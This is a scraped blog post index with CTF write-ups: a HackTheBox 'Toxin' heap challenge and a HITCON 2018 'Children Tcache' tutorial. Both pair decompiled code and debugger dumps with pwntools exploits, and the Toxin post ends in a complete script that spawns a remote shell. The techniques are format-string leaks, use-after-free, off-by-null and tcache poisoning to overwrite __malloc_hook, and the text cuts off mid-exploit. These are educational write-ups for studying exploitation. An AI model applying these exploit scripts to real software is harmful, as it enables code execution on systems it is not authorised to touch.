hope you learned something :)\n","date":"13 February 2021","permalink":"/posts/hunting/","section":"Posts","summary":"This challenge was quite good, as someone who never really did egghunting shellcode, this was a good learning experience. So, the binary given s pretty simple, all the protections have been disabled except the PIE but, analysing the workflow, we can see that it reads shellcode and then execute that shellcode.","title":"HackTheBox Pwn: Hunting"},{"content":"This challenge on the HackTheBox was released recently, the archive attachment contains the following files:\ntoxin: The binary ld-2.27.so and the libc-2.27 file. The given LIBC files hinted towards the binary running on the Ubuntu 18.04 aka Bionic Beaver.\nReverse Engineering #Using the IDA, here\u0026rsquo;s the pseudocode equivalence of the function:-\nadd function #The add function was as follows:-\nint add_toxin() { int v1; // ebx int v2; // [rsp+4h] [rbp-1Ch] size_t size; // [rsp+8h] [rbp-18h] puts(\u0026#34;A new toxin! Fascinating.\u0026#34;); printf(\u0026#34;Toxin chemical formula length: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;size); if ( size \u0026gt; 0xE0 ) return puts(\u0026#34;Chemical formula too long.\u0026#34;); printf(\u0026#34;Toxin index: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v2); if ( v2 \u0026lt; 0 || v2 \u0026gt; 2 || toxins[v2] ) return puts(\u0026#34;Invalid toxin index.\u0026#34;); sizes[v2] = size; v1 = v2; toxins[v1] = malloc(size); printf(\u0026#34;Enter toxin formula: \u0026#34;); return read(0, toxins[v2], size); } This function was responsible for taking the size and allocate a chunk via malloc with the given size and add it to the gloabl pointer toxins, The takeaways from this function was the size restriction was that we can allocate chunks upto 0x70 size and since the index given must be in within index \u0026lt; 0 || index \u0026gt; 2 it\u0026rsquo;ll throw an error, same as for if the chunk is occupied in the global array, it\u0026rsquo;ll just throw the error.\nfree function #This function handles the free functionality for this binary:-\nvoid drink_toxin() { int index; // [rsp+Ch] [rbp-4h] puts(\u0026#34;This is dangerous testing, I\u0026#39;m warning you!\u0026#34;); printf(\u0026#34;Toxin index: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;index); if ( index \u0026gt;= 0 \u0026amp;\u0026amp; index \u0026lt;= 2 \u0026amp;\u0026amp; toxins[index] ) { if ( toxinfreed ) { puts(\u0026#34;You can only drink toxins once, they\u0026#39;re way too poisonous to try again.\u0026#34;); } else { toxinfreed = 1; free(toxins[index]); } } else { puts(\u0026#34;Invalid toxin index.\u0026#34;); } } This function also has constraints which include that we can only call free once, that means we can only have one free chunk. Although when it does free(toxins[index]) it does not NULL out the chunk which might lead to the Use After Free. It also does not make the global pointer toxins[index] to 0 which made this kind of difficult since even if we free this function we won\u0026rsquo;t be able to allocate a new chunk, making us unable to allocate chunk unless the global pointer is not NULL\u0026rsquo;d out.\nedit function #The edit function:-\nint edit_toxin() { int v1; // [rsp+Ch] [rbp-4h] puts(\u0026#34;Adjusting an error?\u0026#34;); printf(\u0026#34;Toxin index: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v1); if ( v1 \u0026lt; 0 || v1 \u0026gt; 2 || !toxins[v1] ) return puts(\u0026#34;Invalid toxin index.\u0026#34;); printf(\u0026#34;Enter toxin formula: \u0026#34;); return read(0, toxins[v1], sizes[v1]); } The function was responsible for editing the alloctaed chunks, although using this, since it only checks whether the global pointer is NULL\u0026rsquo;d or not and the free function does not NULL\u0026rsquo;s out that global pointer, we have a Use After Free vulnerability here, which gave us the ability to overwrite the fd \u0026amp; bk pointer of a free\u0026rsquo;d chunk.\nsearch function #This function allow us to search for a chunk from the global pointer, but there\u0026rsquo;s a catch with printf here.\nint search_toxin() { int i; // [rsp+4h] [rbp-Ch] char s; // [rsp+Ah] [rbp-6h] puts(\u0026#34;Time to search the archives!\u0026#34;); memset(\u0026amp;s, 0, 6uLL); printf(\u0026#34;Enter search term: \u0026#34;); read(0, \u0026amp;s, 5uLL); for ( i = 0; i \u0026lt;= 2; ++i ) { if ( toxins[i] \u0026amp;\u0026amp; !strcmp(\u0026amp;s, (const char *)toxins[i]) ) return printf(\u0026#34;Found at index %d!\\n\u0026#34;, (unsigned int)i); } printf(\u0026amp;s); return puts(\u0026#34; not found.\u0026#34;); } Given the search string, it searches for the chunk(drink) allocated, then it prints the pattern given without any specified, which made this suspectible to format string vulnerability.\nExploitation #The methodology to exploit this is listed as follows:-\nLeak LIBC and ELF address from the format string vulnerability from the search_toxin function. Allocate a chunk. Free that chunk Edit that chunk with the address of the toxinfreed - 0x13, which pointed towards a valid free\u0026rsquo;d chunk pointer. Then do one allocation for returning the first free\u0026rsquo;d pointer, then for third allocation it\u0026rsquo;ll return the toxinfreed address. Overwrite the toxins array\u0026rsquo;s first index with a pointer to the __malloc_hook and then null out the other chunks in toxins array. Edit the chunk 0 since it was overwritten with the ___malloc_hook, overwrite it with one_gadget Do one more allocation, eventually calling the __malloc_hook, resulting in the one_gadget jump and have a shell. Moving on, we make the utlity functions:-\nfrom pwn import * p = remote(\u0026#34;159.65.84.169\u0026#34;, 31307) elf = ELF(\u0026#34;toxin\u0026#34;) libc = elf.libc def alloc(idx, size, content): p.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;1\u0026#34;) p.sendlineafter(\u0026#34;: \u0026#34;, str(size)) p.sendlineafter(\u0026#34;: \u0026#34;, str(idx)) p.sendafter(\u0026#34;: \u0026#34;, content) def edit(idx, content): p.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;2\u0026#34;) p.sendlineafter(\u0026#34;: \u0026#34;, str(idx)) p.sendafter(\u0026#34;: \u0026#34;, content) def free(idx): p.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;3\u0026#34;) p.sendlineafter(\u0026#34;: \u0026#34;, str(idx)) def search_toxin(string): p.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;4\u0026#34;) p.sendlineafter(\u0026#34;: \u0026#34;, string) Now, these functions will help us to interact with the binary more freely, then we have leak the LIBC and ELF address from the search_toxin which are located at 3rd and 9th index.\nsearch_toxin(\u0026#34;%3$p\u0026#34;) libc.address = int(p.recvline().strip(b\u0026#34;\\n\u0026#34;), 16) - 0x110081 log.info(\u0026#34;LIBC: 0x%x\u0026#34; %(libc.address)) search_toxin(\u0026#34;%9$p\u0026#34;) elf.address = int(p.recvline().strip(b\u0026#34;\\n\u0026#34;), 16) - 0x1284 log.info(\u0026#34;ELF: 0x%x\u0026#34; %(elf.address)) Then, we allocate a chunk at index 0 and free it:-\nalloc(0, 0x70, \u0026#34;AAAA\u0026#34;) free(0) Now, we overwrite the fd of that free\u0026rsquo;d chunk with the toxinfreed - 0x13 which was identical for the structure of a chunk with the size being in 0x7f.\ngef➤ x/12xg \u0026amp;toxinfreed 0x555555558050 \u0026lt;toxinfreed\u0026gt;:\t0x0000000000000000\t0x0000000000000000 0x555555558060 \u0026lt;toxins\u0026gt;:\t0x0000000000000000\t0x0000000000000000 0x555555558070 \u0026lt;toxins+16\u0026gt;:\t0x0000000000000000\t0x0000000000000000 0x555555558080 \u0026lt;sizes\u0026gt;:\t0x0000000000000000\t0x0000000000000000 0x555555558090 \u0026lt;sizes+16\u0026gt;:\t0x0000000000000000\t0x0000000000006000 0x5555555580a0:\t0x0000000000000000\t0x0001000300000000 gef➤ x/2xg 0x555555558050 - 0x13 0x55555555803d:\t0xfff7dd0680000000\t0x000000000000007f As you can it has the size as 0z7f, it is identical to the structure of the chunk.\nedit(0, p64(elf.symbols[\u0026#39;toxinfreed\u0026#39;] - 0x13)) Now. we will do a one more allocation and with the second allocation at index 2 will return out target chunk that is toxinfreed.\nalloc(1, 0x70, \u0026#34;BBBBB\u0026#34;) Now. we will craft a payload which will overwrite the toxinfreed as well as the index of the first chunk from the toxins with __malloc_hook as toxinsfreed variable and the toxins are stored contogously.\npayload = b\u0026#34;\\x00\u0026#34;*35 payload += p64(libc.symbols[\u0026#39;__malloc_hook\u0026#39;]) payload += p64(0)*3 payload += p64(0x70) alloc(2, 0x70, payload) We overwrite the toxins array with the 0th index being the pointer to the __malloc_hook.\nNow, we request for the edit function with index 0 that, since overwritten by the __malloc_hook, it\u0026rsquo;ll just return that pointer and we overwrite it with the one_gadget address.\nedit(0, p64(libc.address + 0x10a38c)) ![one_gadget)(/one_gadget.png)\nNow, since we overwritten with __malloc_hook with the one_gadget, we request for one more chunk, which in turn calls malloc from add function and eventually calling the __malloc_hook:-\np.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;1\u0026#34;) p.sendlineafter(\u0026#34;: \u0026#34;, str(0x70)) p.sendlineafter(\u0026#34;: \u0026#34;, \u0026#34;1\u0026#34;) p.interactive() Running the exploit:-\nThen, running it against the server, we get the flag:-\nExploit #The full exploit:-\nfrom pwn import * p = remote(\u0026#34;206.189.18.188\u0026#34;, 32695) elf = ELF(\u0026#34;toxin\u0026#34;) libc = elf.libc def alloc(idx, size, content): p.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;1\u0026#34;) p.sendlineafter(\u0026#34;: \u0026#34;, str(size)) p.sendlineafter(\u0026#34;: \u0026#34;, str(idx)) p.sendafter(\u0026#34;: \u0026#34;, content) def edit(idx, content): p.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;2\u0026#34;) p.sendlineafter(\u0026#34;: \u0026#34;, str(idx)) p.sendafter(\u0026#34;: \u0026#34;, content) def free(idx): p.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;3\u0026#34;) p.sendlineafter(\u0026#34;: \u0026#34;, str(idx)) def search_toxin(string): p.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;4\u0026#34;) p.sendlineafter(\u0026#34;: \u0026#34;, string) search_toxin(\u0026#34;%3$p\u0026#34;) libc.address = int(p.recvline().strip(b\u0026#34;\\n\u0026#34;), 16) - 0x110081 log.info(\u0026#34;LIBC: 0x%x\u0026#34; %(libc.address)) search_toxin(\u0026#34;%9$p\u0026#34;) elf.address = int(p.recvline().strip(b\u0026#34;\\n\u0026#34;), 16) - 0x1284 log.info(\u0026#34;ELF: 0x%x\u0026#34; %(elf.address)) alloc(0, 0x70, \u0026#34;AAAA\u0026#34;) free(0) edit(0, p64(elf.symbols[\u0026#39;toxinfreed\u0026#39;] - 0x13)) alloc(1, 0x70, \u0026#34;BBBBB\u0026#34;) payload = b\u0026#34;\\x00\u0026#34;*35 payload += p64(libc.symbols[\u0026#39;__malloc_hook\u0026#39;]) payload += p64(0)*3 payload += p64(0x70) alloc(2, 0x70, payload) edit(0, p64(libc.address + 0x10a38c)) p.sendlineafter(\u0026#34;\u0026gt; \u0026#34;, \u0026#34;1\u0026#34;) p.sendlineafter(\u0026#34;: \u0026#34;, str(0x70)) p.sendlineafter(\u0026#34;: \u0026#34;, \u0026#34;1\u0026#34;) p.interactive() ","date":"13 February 2021","permalink":"/posts/toxin/","section":"Posts","summary":"This challenge on the HackTheBox was released recently, the archive attachment contains the following files:\ntoxin: The binary ld-2.27.so and the libc-2.27 file. The given LIBC files hinted towards the binary running on the Ubuntu 18.","title":"HackTheBox Pwn: Toxin"},{"content":"","date":null,"permalink":"/tags/pwn-shellcode-egghunting-hackthebox/","section":"Tags","summary":"","title":"Pwn, Shellcode, Egghunting, Hackthebox"},{"content":"","date":null,"permalink":"/tags/pwn-tcache-libc-2.27-hackthebox/","section":"Tags","summary":"","title":"Pwn, Tcache, Libc-2.27, Hackthebox"},{"content":"","date":null,"permalink":"/tags/libc-2.27-heap-pwn-ctf-hitcon-tcache-roppy/","section":"Tags","summary":"","title":"Libc-2.27, Heap, Pwn, Ctf, Hitcon, Tcache, Roppy"},{"content":"This is going to be an in-depth explaination of the overlapping chunks techniques on GLIBC 2.27, this technique can also be produced on the GLIBC 2.23 but for this blog, I did a challenge from HITCON CTF 2018 which seemed very interesting in itself. I loved this challenges as I learned a lot about heap internals and how the heap really recycles the chunk and how prev_size plays a big role here.\nForeword #This technique of overlapping refers to the scenario when a free\u0026rsquo;d chunk actually overlaps into an already allocated chunk resulting in overwriting the heap pointer of the other chunks. This is usally chained with the Off By Null overflow resulting in the PREV_INUSE bit of the next chunk being overwritten.\nThe best way to understand this technique is to make use of the challenge(s) since that way we will analyse the heap as we step in. Now, to start off, there are two binaries taken from the HITCON 2018 CTF, following are the link to the binary, Libc, exploits and IDA database for the corresponding binary.\nAttachment # Children Tcache : https://github.com/D4mianWayne/PwnLand/tree/master/Heap/GLIBC%202.27/Overlapping%20Chunks Baby Tcache : https://github.com/D4mianWayne/PwnLand/tree/master/Heap/GLIBC%202.27/Overlapping%20Chunks/baby_tcache Now, let\u0026rsquo;s continue on the challenges.\nChildren Tcache #This challenge was remarkably easier than the Baby Tcache from the same CTF, that being said, let\u0026rsquo;s start with checking the binary\u0026rsquo;s security:-\nvagrant@ubuntu-bionic:~/sharedFolder/training/hitcon$ checksec baby_tcache [*] \u0026#39;/home/vagrant/sharedFolder/training/hitcon/baby_tcache\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled As expected from the good CTF, all the security mechanisms are enabled but little do we know, it doesn\u0026rsquo;t even matter, let\u0026rsquo;s work on. Now, for this part, explaining the whole binary functionalities would be tiresome and won\u0026rsquo;t be needed at all, all we need to is to find the overall workflow of the binary and where exactly the vulnerability reside. The vulnerabilty as mentioned before the technique we are going to discuss here usually chained with the Off by Null vulnerability.\nunsigned __int64 add() { int i; // [rsp+Ch] [rbp-2034h] char *dest; // [rsp+10h] [rbp-2030h] unsigned __int64 size; // [rsp+18h] [rbp-2028h] char s; // [rsp+20h] [rbp-2020h] unsigned __int64 v5; // [rsp+2038h] [rbp-8h] v5 = __readfsqword(0x28u); memset(\u0026amp;s, 0, 0x2010uLL); for ( i = 0; ; ++i ) { if ( i \u0026gt; 9 ) { puts(\u0026#34;:(\u0026#34;); return __readfsqword(0x28u) ^ v5; } if ( !heap_list[i] ) break; } printf(\u0026#34;Size:\u0026#34;); size = read_int(); if ( size \u0026gt; 0x2000 ) exit(-2); dest = (char *)malloc(size); if ( !dest ) exit(-1); printf(\u0026#34;Data:\u0026#34;); read_string((__int64)\u0026amp;s, size); strcpy(dest, \u0026amp;s); heap_list[i] = dest; size_list[i] = size; return __readfsqword(0x28u) ^ v5; } The read_string is not vulnerable here, actually the issue here is the strcpy(dest, \u0026amp;s), since strcpy copies the data from the \u0026amp;s to the dest including the terminator \\0 null byte, this leads to Off by Null overflow, as the technqiue implies, the man strcpy says:-\nThe strcpy() function copies the string pointed to by src, including the terminating null byte ('\\0\u0026rsquo;), to the buffer pointed to by dest. The strings may not overlap, and the destination string dest must be large enough to receive the copy.\nNow, since we know that there is a vulnerability, we need to know the overall workflow of this binary, the workflow is as following:-\nIt implements 3 basic functions, add, delete and view. It used a global pointer to store information about chunks and the size allocated. The add function is vulnerable to the Off by Null vulnerability. It allows the allocation size upto 0x2000. There\u0026rsquo;s no Use After Free vulnerability. It allows the active number of allocations upto 10(inclusice) times. Exploitation #First and foremost, I created the wrapper functions such that we interact with binary more freely:-\nfrom pwn import * def new_heap(size, data, attack=False): p.sendlineafter(\u0026#39;Your choice: \u0026#39;, \u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;Size:\u0026#39;, str(size)) if attack: return p.sendafter(\u0026#39;Data:\u0026#39;, data) if len(data) \u0026lt; size: p.sendline() def show_heap(index): p.sendlineafter(\u0026#39;Your choice: \u0026#39;, \u0026#39;2\u0026#39;) p.sendlineafter(\u0026#39;Index:\u0026#39;, str(index)) def delete_heap(index): p.sendlineafter(\u0026#39;Your choice: \u0026#39;, \u0026#39;3\u0026#39;) p.sendlineafter(\u0026#39;Index:\u0026#39;, str(index)) This being aide, now let\u0026rsquo;s jump into the heap exploitation part, to start off, we will create following number of chunks:-\n0x500 size chunk. 0x68 size chunk. 0x5f0 size chunk. 0x18 size chunk. This is because, we will need the 2 chunk of size such that when tcache bins would be full they\u0026rsquo;ll land into the unsorted bin. Moving on, we will fill the tcache bins for the size of the chunks we allocated:-\np = process(\u0026#34;./children_tcache\u0026#34;) # heap_list[0] =\u0026gt; chunk_0 (0x511) new_heap(0x500, \u0026#39;a\u0026#39; * 0x4ff) # heap_list[1] =\u0026gt; chunk_1 (0x71) new_heap(0x68, \u0026#39;b\u0026#39; * 0x67) # heap_list[2] =\u0026gt; chunk_2 (0x601) new_heap(0x5f0, \u0026#39;c\u0026#39; * 0x5ef) # heap_list[3] =\u0026gt; chunk_3 (0x31) # This chunk is for preventing consolidation of previous chunk with the top chunk new_heap(0x20, \u0026#39;d\u0026#39; * 0x20) Now, this will do the allocation, as nothing important to see as much, to explain the size allocation here, we will be unsorted bin size for doing the overlapping chunk here, to move on, we will delete the chunk_1 and chunk_0, the chunk_1 belongs to the unsorted bin since it\u0026rsquo;s size is morte than the tcache can hold and the chunk_0 will go in the tcache.\n# we need to delete chunk_1, this is because we will be using this chunk to # to trigger the off-by-null (poison-null-byte) attack delete_heap(1) # chunk_0 should be freed so it can be consolidated with chunk_2 later delete_heap(0) Running the exploit:-\nef➤ heap bins ──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ──────────────────────────────────────────────────── Tcachebins[idx=5, size=0x70] count=1 ← Chunk(addr=0x555555757770, size=0x70, flags=) ───────────────────────────────────────────────────── Fastbins for arena 0x7ffff7dcdc40 ───────────────────────────────────────────────────── Fastbins[idx=0, size=0x20] 0x00 Fastbins[idx=1, size=0x30] 0x00 Fastbins[idx=2, size=0x40] 0x00 Fastbins[idx=3, size=0x50] 0x00 Fastbins[idx=4, size=0x60] 0x00 Fastbins[idx=5, size=0x70] 0x00 Fastbins[idx=6, size=0x80] 0x00 ──────────────────────────────────────────────────── Unsorted Bin for arena \u0026#39;main_arena\u0026#39; ──────────────────────────────────────────────────── [+] unsorted_bins[0]: fw=0x555555757250, bk=0x555555757250 → Chunk(addr=0x555555757260, size=0x510, flags=PREV_INUSE) [+] Found 1 chunks in unsorted bin. ───────────────────────────────────────────────────── Small Bins for arena \u0026#39;main_arena\u0026#39; ───────────────────────────────────────────────────── [+] Found 0 chunks in 0 small non-empty bins. ───────────────────────────────────────────────────── Large Bins for arena \u0026#39;main_arena\u0026#39; ───────────────────────────────────────────────────── [+] Found 0 chunks in 0 large non-empty bins. gef➤ Now, as you can see the chunk 0x555555757260 belongs to the unsorted bin and the chunk 0x555555757770 belongs to the tcache\u0026rsquo;s bin[5] being the size 0x70. Now, the tricky part is that, whenever the chunk is free\u0026rsquo;d, the program memsets the free\u0026rsquo;d chunk with the 0xda byte by byte, overwriting whatever was written in the chunk so far.\n# when we free a chunk, programs writes 0xDA to the whole chunk # so, we need to zero out some parts of the chunk_1. Therefore, # we are allocating/freeing the chunk_1 multiple times with different sizes # interestingly, it always have chunk size of 0x71, but the program only cares # about the input size for i in range(9): # heap_list[0] =\u0026gt; chunk_1 (0x71) # this causes strcpy writes null byte at the end of buffer. # when i == 0, off-by-one happens and turn size of chunk_2 from # 0x601 t0 0x600. Therefore, we clear PREV_IN_USE bit. new_heap(0x68 - i, \u0026#39;b\u0026#39; * (0x68 - i)) # we need to free the chunk, so malloc returns it on the next new_heap call delete_heap(0) So, what we do here is, since the free\u0026rsquo;d chunk\u0026rsquo;s contents is being overwritten by the 0xda byte by byte, to mitigate this in such a way that the chunk_1, the chunk which went into the tcache, so here doing constant allocation of the size ranging from the 0x5f to 0x68, all of them will land into the tcache bin[5] since the rounding size for the chunks allocated in that range will have the 0x70 size and will be in the bin[5].\nNow, doing allocation and the deletion of the chunks accordingly, since the strcpy will append the \\0 to the adjancent chunk and the continual deletion and the allocation of the chunks as the size is same as of 0x70, for every allocation it\u0026rsquo;ll just return the chunk from the bin[5], this will result in the PREV_INUSE flag of the adjacent chunk being overwritten.\ngef➤ heap bins ──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ──────────────────────────────────────────────────── Tcachebins[idx=5, size=0x70] count=1 ← Chunk(addr=0x555555757770, size=0x70, flags=) ───────────────────────────────────────────────────── Fastbins for arena 0x7ffff7dcdc40 ───────────────────────────────────────────────────── Fastbins[idx=0, size=0x20] 0x00 Fastbins[idx=1, size=0x30] 0x00 Fastbins[idx=2, size=0x40] 0x00 Fastbins[idx=3, size=0x50] 0x00 Fastbins[idx=4, size=0x60] 0x00 Fastbins[idx=5, size=0x70] 0x00 Fastbins[idx=6, size=0x80] 0x00 ──────────────────────────────────────────────────── Unsorted Bin for arena \u0026#39;main_arena\u0026#39; ──────────────────────────────────────────────────── [+] unsorted_bins[0]: fw=0x555555757250, bk=0x555555757250 → Chunk(addr=0x555555757260, size=0x510, flags=PREV_INUSE) [+] Found 1 chunks in unsorted bin. ───────────────────────────────────────────────────── Small Bins for arena \u0026#39;main_arena\u0026#39; ───────────────────────────────────────────────────── [+] Found 0 chunks in 0 small non-empty bins. ───────────────────────────────────────────────────── Large Bins for arena \u0026#39;main_arena\u0026#39; ───────────────────────────────────────────────────── [+] Found 0 chunks in 0 large non-empty bins. gef➤ x/10xg 0x0000555555554000 + 0x202060 0x555555756060:\t0x0000000000000000\t0x0000000000000000 0x555555756070:\t0x00005555557577e0\t0x0000555555757de0 gef➤ x/2xg 0x00005555557577e0 - 0x10 0x5555557577d0:\t0x0000000000000000\t0x0000000000000600 gef➤ heap chunk 0x00005555557577e0 Chunk(addr=0x5555557577e0, size=0x600, flags=) Chunk size: 1536 (0x600) Usable size: 1528 (0x5f8) Previous chunk size: 0 (0x0) PREV_INUSE flag: Off IS_MMAPPED flag: Off NON_MAIN_ARENA flag: Off gef➤ Now, as you can see the heap_list is at the address 0x555555756060 which have the chunk 0x00005555557577e0 at the index 2, seeing the PREV_INUSE flag for that chunk we see that it is cleared. Now, to work on with this, we will overwrite the prev_size for the chunk_2, what we will do is allocate a chunk of size 0x68 such that it\u0026rsquo;ll be returned by the tcache and we will overwrite the adjacent chunk\u0026rsquo;s i.e. chunk_2\u0026rsquo;s prev_size.\n# heap_list[0] =\u0026gt; chunk_1 (0x71) # this set the prev_size field of chunk_2 new_heap(0x68, b\u0026#39;b\u0026#39; * 0x60 + p64(0x580)) # when we free chunk_2, it consolidates with chunk_0 # therefore, we have a overlapping free chunk with chunk_1 # the resulting big chunk will be put in the unsorted bin delete_heap(2) Doing so,\ngef➤ heap bins ──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ──────────────────────────────────────────────────── ───────────────────────────────────────────────────── Fastbins for arena 0x7ffff7dcdc40 ───────────────────────────────────────────────────── Fastbins[idx=0, size=0x20] 0x00 Fastbins[idx=1, size=0x30] 0x00 Fastbins[idx=2, size=0x40] 0x00 Fastbins[idx=3, size=0x50] 0x00 Fastbins[idx=4, size=0x60] 0x00 Fastbins[idx=5, size=0x70] 0x00 Fastbins[idx=6, size=0x80] 0x00 ──────────────────────────────────────────────────── Unsorted Bin for arena \u0026#39;main_arena\u0026#39; ──────────────────────────────────────────────────── [+] unsorted_bins[0]: fw=0x555555757250, bk=0x555555757250 → Chunk(addr=0x555555757260, size=0xb80, flags=PREV_INUSE) [+] Found 1 chunks in unsorted bin. ───────────────────────────────────────────────────── Small Bins for arena \u0026#39;main_arena\u0026#39; ───────────────────────────────────────────────────── [+] Found 0 chunks in 0 small non-empty bins. ───────────────────────────────────────────────────── Large Bins for arena \u0026#39;main_arena\u0026#39; ───────────────────────────────────────────────────── [+] Found 0 chunks in 0 large non-empty bins. gef➤ x/10xg 0x0000555555554000 + 0x202060 0x555555756060:\t0x0000555555757770\t0x0000000000000000 0x555555756070:\t0x0000000000000000\t0x0000555555757de0 0x555555756080:\t0x0000000000000000\t0x0000000000000000 0x555555756090:\t0x0000000000000000\t0x0000000000000000 0x5555557560a0:\t0x0000000000000000\t0x0000000000000000 gef➤ x/30xg 0x0000555555757770 0x555555757770:\t0x6262626262626262\t0x6262626262626262 0x555555757780:\t0x6262626262626262\t0x6262626262626262 0x555555757790:\t0x6262626262626262\t0x6262626262626262 0x5555557577a0:\t0x6262626262626262\t0x6262626262626262 0x5555557577b0:\t0x6262626262626262\t0x6262626262626262 0x5555557577c0:\t0x6262626262626262\t0x6262626262626262 0x5555557577d0:\t0x0000000000000580\t0x0000000000000600 \u0026lt;-------------- The prev_size has been overwritten Now, we will have to free(2) such that the chunk_3 the target chunk having the prev_size value 0x580 will consolidate with the chunk 0x0000555555757770, so when we allocate a chunk of the size being the 0x508 this will result in the fd and the bk being populated with the main_arena\u0026rsquo;s address for the chunk 0x0000555555757770, so initially the chunk_0 i.e. 0x0000555555757770 was not cleared but consolidated but since the global pointer contains this chunk\u0026rsquo;s pointer on the index 0, doing show(0), we will have the LIBC leak, with the help of it we can defeat the ASLR.\n# heap_list[1] =\u0026gt; chunk_4 (0x511) # this will use the unsorted bin for allocation, and writes # a libc address into chunk_1 fd/bk fi new_heap(0x508, \u0026#39;e\u0026#39; * 0x507) # viwing chunk_1 will leak libc address show_heap(0) libc_addr = p.recvuntil(\u0026#39;\\n$$\u0026#39;)[:-3] libc_base = u64(libc_addr + b\u0026#39;\\x00\u0026#39; * (8 - len(libc_addr))) - 0x3ebca0 log.info(\u0026#39;LIBC Base: {}\u0026#39;.format(hex(libc_base))) Now, doing so:-\ngef➤ x/10xg 0x0000555555554000 + 0x202060 0x555555756060:\t0x0000555555757770\t0x0000555555757260 0x555555756070:\t0x0000000000000000\t0x0000555555757de0 0x555555756080:\t0x0000000000000000\t0x0000000000000000 0x555555756090:\t0x0000000000000000\t0x0000000000000000 0x5555557560a0:\t0x0000000000000000\t0x0000000000000000 gef➤ x/8xg 0x0000555555757770 - 0x10 0x555555757760:\t0x0065656565656565\t0x0000000000000671 \u0026lt;--- the 0x671 = (0x600 + 0x71) is consolidated and for which after the allocation the fd \u0026amp; bk is populated 0x555555757770:\t0x00007ffff7dcdca0\t0x00007ffff7dcdca0 Having the leak:-\nvagrant@ubuntu-bionic:~/sharedFolder/training/hitcon$ python3 children_tcache.py [+] Starting local process \u0026#39;./children_tcache\u0026#39;: pid 2842 [*] LIBC Base: 0x7ffff79e2000 [*] Switching to interactive mode $$$$$$$$$$$$$$$$$$$$$$$$$ 🍊 Children Tcache 🍊 $$$$$$$$$$$$$$$$$$$$$$$$$$$ $ 1. New heap $ $ 2. Show heap $ $ 3. Delete heap $ $ 4. Exit $ $$$$$$$$$$$$$$$$$$$$$$$$$$$ Your choice: $ Now, we have the LIBC leak, defeating the ASLR, we have to now force the malloc to return a pointer which we can overwrite like __malloc_hook or __free_hook by taking advantage of the heap layout. To do so, initally we will take the overlapping of these chunks to get the duplicate entry, to replicate it, we will allocate a chunk of size 0x68 this will return the chunk as same as of the chunk_1. So, when we do the free(1) and free(5), it\u0026rsquo;ll result in the same chunk being deleted, since two chunks are free\u0026rsquo;d the tcache will have the duplicate entry for the chunks, making a loop, due to which we will be able to overwrite the fd \u0026amp; bk of the free\u0026rsquo;d chunk and let it return the chunk.\n# heap_list[2] =\u0026gt; chunk_5 (0x71) # this will allocate chunk_5 exactly in the same place as chunk_1 new_heap(0x68, \u0026#39;f\u0026#39; * 0x67) # we used tcache_dup attack here which is due to double free # freeing chunk_1 and chunk_5 put them in the same bin in tcache # even though they are pointing to the same address # This will create a loop within the tcache bin delete_heap(0) delete_heap(2) Now, doing so, when we see the heap layout:-\ngef➤ heap bins ──────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcdc40 ──────────────────────────────────────────────────── Tcachebins[idx=5, size=0x70] count=2 ← Chunk(addr=0x555555757770, size=0x70, flags=PREV_INUSE) ← Chunk(addr=0x555555757770, size=0x70, flags=PREV_INUSE) → [loop detected] ───────────────────────────────────────────────────── Fastbins for arena 0x7ffff7dcdc40 ───────────────────────────────────────────────────── Fastbins[idx=0, size=0x20] 0x00 Fastbins[idx=1, size=0x30] 0x00 Fastbins[idx=2, size=0x40] 0x00 Fastbins[idx=3, size=0x50] 0x00 Fastbins[idx=4, size=0x60] 0x00 Fastbins[idx=5, size=0x70] 0x00 Fastbins[idx=6, size=0x80] 0x00 ──────────────────────────────────────────────────── Unsorted Bin for arena \u0026#39;main_arena\u0026#39; ──────────────────────────────────────────────────── [+] unsorted_bins[0]: fw=0x5555557577d0, bk=0x5555557577d0 → Chunk(addr=0x5555557577e0, size=0x600, flags=PREV_INUSE) [+] Found 1 chunks in unsorted bin. ───────────────────────────────────────────────────── Small Bins for arena \u0026#39;main_arena\u0026#39; ───────────────────────────────────────────────────── [+] Found 0 chunks in 0 small non-empty bins. ───────────────────────────────────────────────────── Large Bins for arena \u0026#39;main_arena\u0026#39; ───────────────────────────────────────────────────── [+] Found 0 chunks in 0 large non-empty bins. gef➤ x/10xg 0x555555757770 0x555555757770:\t0x0000555555757770\t0x0000555555757010 The fd of this chunk is overwritten with its own address 0x555555757780:\t0xdadadadadadadada\t0xdadadadadadadada 0x555555757790:\t0xdadadadadadadada\t0xdadadadadadadada 0x5555557577a0:\t0xdadadadadadadada\t0xdadadadadadadada As shown from the tcache bins, we have a free\u0026rsquo;d chunk\u0026rsquo;s fd is pointing to it\u0026rsquo;s own address, which commonly refer as tcache dup entry. Now, we will overwrite the fd of the same chunk with the target chunk, for the target chunk I used the __malloc_hook but you can also go with the __free_hook way:-\nNow, to do so, we will allocate a chunk, which will return the chunk 0x0000555555757770, then we will overwrite the fd pointer with the target chunk __malloc_hook, then we will do one more allocation such that it\u0026rsquo;ll have the tcache head pointing to the target chunk adress:-\n# we can create a fake chunk i.e. target pointing to the __malloc_hook malloc_hook = libc_base + 0x3ebc30 fake_chunk = malloc_hook log.info(\u0026#39;fake chunk: {}\u0026#39;.format(hex(fake_chunk))) # heap_list[4] =\u0026gt; chunk_5 (0x71) # we used tcache_poisoning here 